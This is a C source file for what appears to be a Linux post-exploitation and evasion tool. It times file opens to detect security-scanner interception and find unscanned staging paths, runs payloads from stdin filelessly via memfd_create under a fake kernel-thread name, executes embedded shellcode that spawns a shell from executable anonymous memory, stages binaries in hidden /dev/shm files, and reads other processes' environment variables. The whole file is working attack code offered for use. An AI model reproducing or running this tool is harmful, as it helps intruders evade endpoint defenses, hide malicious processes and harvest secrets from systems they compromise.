#define _GNU_SOURCE
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/memfd.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <time.h>
#include <dirent.h>

static const uint8_t SH_SC[] = {
    0x48,0x31,0xf6,0x56,0x48,0xbf,0x2f,0x62,0x69,0x6e,
    0x2f,0x2f,0x73,0x68,0x57,0x54,0x5f,0x48,0x31,0xd2,
    0x48,0x31,0xc0,0xb0,0x3b,0x0f,0x05
};

static double open_latency_us(const char *path, int n)
{
    struct timespec t0, t1; long total = 0;
    for (int i = 0; i < n; i++) {
        clock_gettime(CLOCK_MONOTONIC, &t0);
        int fd = open(path, O_RDONLY);
        if (fd >= 0) close(fd);
        clock_gettime(CLOCK_MONOTONIC, &t1);
        total += (long)((t1.tv_sec - t0.tv_sec) * 1000000000L +
                        (t1.tv_nsec - t0.tv_nsec));
    }
    return (double)total / n / 1000.0;
}

static void probe(void)
{

    char tmp[64]; snprintf(tmp, sizeof(tmp), "/tmp/.fp%d", getpid());
    FILE *f = fopen(tmp, "w"); if (f) { fputs("x", f); fclose(f); }

    double lat_tmp = open_latency_us(tmp, 300);
    unlink(tmp);

    char shm[64]; snprintf(shm, sizeof(shm), "/dev/shm/.fp%d", getpid());
    f = fopen(shm, "w"); if (f) { fputs("x", f); fclose(f); }
    double lat_shm = open_latency_us(shm, 300);
    unlink(shm);

    double lat_proc = open_latency_us("/proc/self/maps", 300);

    printf("open /tmp:     %.1f us  %s\n", lat_tmp,
           lat_tmp > 1000.0 ? "[blocking intercept active]" : "[clean]");
    printf("open /dev/shm: %.1f us  %s\n", lat_shm,
           lat_shm < lat_tmp / 5.0 ? "[outside scan scope - usable for staging]" :
                                      "[also intercepted]");
    printf("open /proc:    %.1f us  %s\n", lat_proc,
           lat_proc < 500.0 ? "[procfs not marked]" : "");
}

static void memfd_exec(void)
{
    int mfd = (int)syscall(__NR_memfd_create, "", MFD_CLOEXEC);
    if (mfd < 0) { perror("memfd_create"); return; }

    uint8_t buf[65536]; ssize_t n, total = 0;
    while ((n = read(STDIN_FILENO, buf, sizeof(buf))) > 0) {
        write(mfd, buf, (size_t)n); total += n;
    }

    char path[64]; snprintf(path, sizeof(path), "/proc/self/fd/%d", mfd);
    fprintf(stderr, "[*] %zd bytes  fd=%d -> %s\n", total, mfd, path);

    char *argv[] = { (char *)"[kworker/u4:1]", NULL };
    execve(path, argv, environ);
    perror("execve");
}

static void anon_exec(void)
{
    size_t sz = (sizeof(SH_SC) + 4095) & ~4095UL;
    void *mem = mmap(NULL, sz, PROT_READ|PROT_WRITE|PROT_EXEC,
                     MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (mem == MAP_FAILED) { perror("mmap"); return; }
    memcpy(mem, SH_SC, sizeof(SH_SC));
    __builtin___clear_cache((char *)mem, (char *)mem + sizeof(SH_SC));
    ((void(*)(void))mem)();
}

static void devshm_exec(const char *src)
{
    char dst[64]; snprintf(dst, sizeof(dst), "/dev/shm/.%d", getpid());

    int s = open(src, O_RDONLY);
    if (s < 0) { perror("open src"); return; }
    int d = open(dst, O_WRONLY|O_CREAT|O_TRUNC, 0755);
    if (d < 0) { perror("open dst"); close(s); return; }

    uint8_t buf[65536]; ssize_t n;
    while ((n = read(s, buf, sizeof(buf))) > 0) write(d, buf, (size_t)n);
    close(s); close(d);

    char *argv[] = { (char *)"[kworker/u4:1]", NULL };
    execve(dst, argv, environ);
    perror("execve"); unlink(dst);
}

static void proc_read(pid_t pid)
{
    char path[64]; snprintf(path, sizeof(path), "/proc/%d/environ", pid);
    int fd = open(path, O_RDONLY);
    if (fd < 0) { perror("open"); return; }
    char buf[131072]; ssize_t n = read(fd, buf, sizeof(buf)-1);
    close(fd);
    if (n <= 0) return;
    for (ssize_t i = 0; i < n; i++) putchar(buf[i] ? buf[i] : '\n');
    putchar('\n');
}

int main(int argc, char *argv[])
{
    if (argc < 2) {
        fprintf(stderr, "usage: %s <--probe|--memfd-exec|--anon-exec|--devshm|--proc-read>\n", argv[0]);
        return 1;
    }
    if (!strcmp(argv[1],"--probe"))          { probe(); return 0; }
    if (!strcmp(argv[1],"--memfd-exec"))     { memfd_exec(); return 0; }
    if (!strcmp(argv[1],"--anon-exec"))      { anon_exec(); return 0; }
    if (!strcmp(argv[1],"--devshm") && argc>=3) { devshm_exec(argv[2]); return 0; }
    if (!strcmp(argv[1],"--proc-read") && argc>=3) { proc_read(atoi(argv[2])); return 0; }
    fprintf(stderr,"unknown argument\n"); return 1;
}
